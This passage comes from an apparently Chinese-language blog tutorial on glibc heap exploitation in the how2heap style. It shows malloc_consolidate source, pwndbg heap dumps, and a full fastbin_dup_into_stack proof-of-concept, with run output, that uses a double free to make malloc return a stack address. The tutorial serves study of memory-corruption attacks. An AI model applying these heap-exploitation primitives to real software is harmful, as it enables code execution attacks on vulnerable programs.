class="hljs-title">atomic_store_relaxed</span> (&amp;av-&gt;</span>have_fastchunks, <span class="hljs-literal">false</span>);<br>  unsorted_bin = unsorted_chunks(av);<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">    then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">    placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">    reused anyway.</span><br><span class="hljs-comment">  */</span><br>  maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>  fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">do</span> &#123;<br>    p = atomic_exchange_acq (fb, NULL);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">do</span> &#123;<br>        &#123;<br>          unsigned int idx = fastbin_index (chunksize (p));<br>          <span class="hljs-keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<br>            malloc_printerr (<span class="hljs-string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);<br>        &#125;<br>        check_inuse_chunk(av, p);<br>        <span class="hljs-function"><span class="hljs-title">nextp</span> = p-&gt;</span>fd;<br>        <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>        size = chunksize (p);<br>        nextchunk = chunk_at_offset(p, size);<br>        nextsize = chunksize(nextchunk);<br>        <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>          prevsize = prev_size (p);<br>          size += prevsize;<br>          p = chunk_at_offset(p, -((long) prevsize));<br>          <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>            malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);<br>          unlink_chunk (av, p);<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-title">if</span> (nextchunk != av-&gt;</span>top) &#123;<br>          nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>          <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>            size += nextsize;<br>            unlink_chunk (av, nextchunk);<br>          &#125; <span class="hljs-keyword">else</span><br>            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>          <span class="hljs-function"><span class="hljs-title">first_unsorted</span> = unsorted_bin-&gt;</span>fd;<br>          <span class="hljs-function"><span class="hljs-title">unsorted_bin</span>-&gt;</span>fd = p;<br>          <span class="hljs-function"><span class="hljs-title">first_unsorted</span>-&gt;</span>bk = p;<br>          <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd_nextsize = NULL;<br>            <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk_nextsize = NULL;<br>          &#125;<br>          set_head(p, size | PREV_INUSE);<br>          <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>bk = unsorted_bin;<br>          <span class="hljs-function"><span class="hljs-title">p</span>-&gt;</span>fd = first_unsorted;<br>          set_foot(p, size);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>          size += nextsize;<br>          set_head(p, size | PREV_INUSE);<br>          <span class="hljs-function"><span class="hljs-title">av</span>-&gt;</span>top = p;<br>        &#125;<br>      &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我做一个解释</p><p>先确定堆是否被初始化了(也就是get_max_fast()函数),如果没有就初始化堆，然后退出函数</p><p>从 fastbin 中获取一个空闲 chunk,尝试向后合并</p><p>如果不能向后合并就尝试向前合并</p><p>如果向前合并的时候与top_chunk相邻,就直接归到top_chunk中</p><p>如果并不相邻就插入到unsorted bin,然后继续取fastbin chunk直到fastbin list为空结束</p><p>本例中的触发代码为:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs applescript">/*<br>​     If this <span class="hljs-keyword">is</span> a large request, consolidate fastbins <span class="hljs-keyword">before</span> continuing.<br>​     While <span class="hljs-keyword">it</span> might look excessive <span class="hljs-keyword">to</span> kill all fastbins <span class="hljs-keyword">before</span><br>​     even seeing <span class="hljs-keyword">if</span> there <span class="hljs-keyword">is</span> <span class="hljs-literal">space</span> available, this avoids<br>​     fragmentation problems normally associated <span class="hljs-keyword">with</span> fastbins.<br>​     Also, <span class="hljs-keyword">in</span> practice, programs tend <span class="hljs-keyword">to</span> have runs <span class="hljs-keyword">of</span> either small <span class="hljs-keyword">or</span><br>​     large requests, <span class="hljs-keyword">but</span> less often mixtures, so consolidation <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span><br>​     invoked all <span class="hljs-keyword">that</span> often <span class="hljs-keyword">in</span> most programs. And <span class="hljs-keyword">the</span> programs <span class="hljs-keyword">that</span><br>​     <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> called frequently <span class="hljs-keyword">in</span> otherwise tend <span class="hljs-keyword">to</span> fragment.<br>   */<br><br>  <span class="hljs-keyword">else</span><br>​    &#123;<br>​      idx = largebin_index (nb);<br>​      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>​        malloc_consolidate (av);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>说好的unsorted bin呢????</li></ol><p>这还是得从glibc的实现说起,为什么调试的时候我们的chunk并不在unsorted bin中而是在small bin中呢?</p><p>对glibc不太熟悉的同学可以先看下我之前的文章<a href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">glibc内存管理机制</a></p><p>这部分可以在我的文章中搜索large bin直接到第8个地方,不想跳转的同学我这里也做一下简短的解释</p><p>我们在分配largebin时,ptmalloc会先遍历一下fastbin,将相邻的 chunk 进行合并，并链接到 unsorted bin 中然后遍历 unsorted bin 中的 chunk，如果 unsorted bin 只 有一个 chunk，并且这个 chunk 在上次分配时被使用过，并且所需分配的 chunk 大 小属于 small bins，并且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，分配结束，否则将根据 chunk 的空间大小将其放入 small bins 或是 large bins 中</p><p>这就是为什么不在unsorted bin而在small bin中的原因了</p><p>下面就是一点点的拓展</p><p>然后如果连large bin中都没有合适的,那就只能从top chunk中分割出一部分了,如果连top chunk也不满足,那就会mmap或brk一块内存增加top chunk的大小</p><h3 id="part-3"><a href="#part-3" class="headerlink" title="part 3"></a>part 3</h3><p>之后我们继续调试,我们现在第二次free p1,此时的堆结构</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x602000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">81</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x7ffff7dd1bb8 <span class="hljs-operator">&lt;</span>main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span><span class="hljs-operator">&gt;</span>,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x602050 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6020a0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">1041</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x6024b0 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">133969</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br><span class="hljs-number">0</span>x50 [corrupted]<br><span class="hljs-params">FD:</span> <span class="hljs-number">0</span>x602000 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-params">BK:</span> <span class="hljs-number">0</span>x602000 —▸ <span class="hljs-number">0</span>x7ffff7dd1bb8 (main_arena<span class="hljs-operator">+</span><span class="hljs-number">152</span>) ◂— <span class="hljs-number">0</span>x602000<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>这里就可以看到他既在smallbins中又在fastbin中了,这又是为什么呢?</p><p>因为再free的时候ptmalloc会发现fastbin是空的,因此就把他扔到fastbin中去了</p><p>此时就可以分配两次p1了,一次系统会在fastbin中取出(优先查看fastbin),第二次就会在smallbins中取出:)</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了两个fastbin chunk(0x40),然后free掉第一个chunk</p><p>这里为啥不free第二个呢,因为如果free第二个的话就会和top chunk相邻了,此时会触发top chunk的合并</p><p>之后程序调用了malloc函数malloc了一个large bin,触发了malloc_consoldate()函数,导致我们free掉的chunk1被放入了small bin中</p><p>然后程序第二次free chunk1,ptmalloc会先看fastbin中有没有,发现没有,于是就把chunk1放到fast bin中了,这时chunk1就在fastbin和smallbin中各有一个</p><p>此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户</p><p>我们就有了两个拥有同样内存的chunk</p><h1 id="0x04-fastbin-dup-into-stack"><a href="#0x04-fastbin-dup-into-stack" class="headerlink" title="0x04 fastbin_dup_into_stack"></a>0x04 fastbin_dup_into_stack</h1><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><p>这里我也加了一点点小翻译:)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-comment">//这个程序就是fast_dup.c的2.0版本,作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时在我们所能控制的栈上分配</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br>               <span class="hljs-string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> stack_var;<br><br>        <span class="hljs-comment">//我们控制分配的地址就是这个栈上变量的地方</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-type">char</span> *)&amp;stack_var);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 3 buffers.\n&quot;</span>);<br>        <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>        <span class="hljs-type">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, a);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, b);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p\n&quot;</span>, c);<br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br>        <span class="hljs-built_in">free</span>(a);<br><br>        <span class="hljs-comment">//这里还是一样的,不能连续释放同一个chunk</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);<br>        <span class="hljs-comment">// free(a);</span><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);<br>        <span class="hljs-built_in">free</span>(b);<br><br>        <span class="hljs-comment">//这里再次,释放a,double free</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);<br>        <span class="hljs-built_in">free</span>(a);<br><br><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br>                <span class="hljs-string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);<br>        <span class="hljs-comment">//现在第一次分配内存,取出chunk a 赋给chunk d</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>        <span class="hljs-comment">//现在分配两次内存,取出chunk a,chunk b</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(8): %p\n&quot;</span>, d);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br>        <span class="hljs-comment">//现在free list就只剩下一个chunk a了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);<br><br>        <span class="hljs-comment">//现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br>                <span class="hljs-string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br>                <span class="hljs-string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br>                <span class="hljs-string">&quot;return a pointer to it.\n&quot;</span>, a);<br>        stack_var = <span class="hljs-number">0x20</span>;<br>        <br>        <span class="hljs-comment">//现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);<br>        *d = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>) (((<span class="hljs-type">char</span>*)&amp;stack_var) - <span class="hljs-built_in">sizeof</span>(d));<br><br>        <span class="hljs-comment">//这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs applescript">This <span class="hljs-built_in">file</span> extends <span class="hljs-keyword">on</span> fastbin_dup.c <span class="hljs-keyword">by</span> tricking malloc <span class="hljs-keyword">into</span><br><span class="hljs-keyword">returning</span> a pointer <span class="hljs-keyword">to</span> a controlled location (<span class="hljs-keyword">in</span> this case, <span class="hljs-keyword">the</span> stack).<br>The address we want malloc() <span class="hljs-keyword">to</span> <span class="hljs-literal">return</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x7ffe5c42b638</span>.<br>Allocating <span class="hljs-number">3</span> buffers.<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632030</span><br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632050</span><br>Freeing <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> one...<br>If we free <span class="hljs-number">0x632010</span> again, things will crash because <span class="hljs-number">0x632010</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> top <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span>.<br>So, instead, we&#x27;ll free <span class="hljs-number">0x632030</span>.<br>Now, we can free <span class="hljs-number">0x632010</span> again, <span class="hljs-keyword">since</span> <span class="hljs-keyword">it</span>&#x27;s <span class="hljs-keyword">not</span> <span class="hljs-keyword">the</span> head <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span>.<br>Now <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span> has [ <span class="hljs-number">0x632010</span>, <span class="hljs-number">0x632030</span>, <span class="hljs-number">0x632010</span> ]. We&#x27;ll now carry out our attack <span class="hljs-keyword">by</span> modifying data <span class="hljs-keyword">at</span> <span class="hljs-number">0x632010</span>.<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632010</span><br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632030</span><br>Now <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span> has [ <span class="hljs-number">0x632010</span> ].<br>Now, we have access <span class="hljs-keyword">to</span> <span class="hljs-number">0x632010</span> <span class="hljs-keyword">while</span> <span class="hljs-keyword">it</span> remains <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> head <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span>.<br>so now we are writing a fake free size (<span class="hljs-keyword">in</span> this case, <span class="hljs-number">0x20</span>) <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> stack,<br>so <span class="hljs-keyword">that</span> malloc will think there <span class="hljs-keyword">is</span> a free chunk there <span class="hljs-keyword">and</span> agree <span class="hljs-keyword">to</span><br><span class="hljs-built_in">return</span> a pointer <span class="hljs-keyword">to</span> <span class="hljs-keyword">it</span>.<br>Now, we overwrite <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-number">8</span> bytes <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> data <span class="hljs-keyword">at</span> <span class="hljs-number">0x632010</span> <span class="hljs-keyword">to</span> point right <span class="hljs-keyword">before</span> <span class="hljs-keyword">the</span> <span class="hljs-number">0x20</span>.<br><span class="hljs-number">3</span>rd malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x632010</span>, putting <span class="hljs-keyword">the</span> stack address <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> free <span class="hljs-built_in">list</span><br><span class="hljs-number">4</span>th malloc(<span class="hljs-number">8</span>): <span class="hljs-number">0x7ffe5c42b638</span><br></code></pre></td></tr></table></figure><h2 id="关键部分调试-3"><a href="#关键部分调试-3" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>本次程序我在第41行,也就是给stack赋值之前的地方,第49行即给d赋值后,最后一个是在52行即最后的地方下断点</p><p>此时运行程序,我们看一下堆:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x603020,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x21<br>&#125;<br><span class="hljs-number">0</span>x603020 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x603000,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x21<br>&#125;<br><span class="hljs-number">0</span>x603040 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x20fa1<br>&#125;<br><span class="hljs-number">0</span>x603060 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">135073</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span 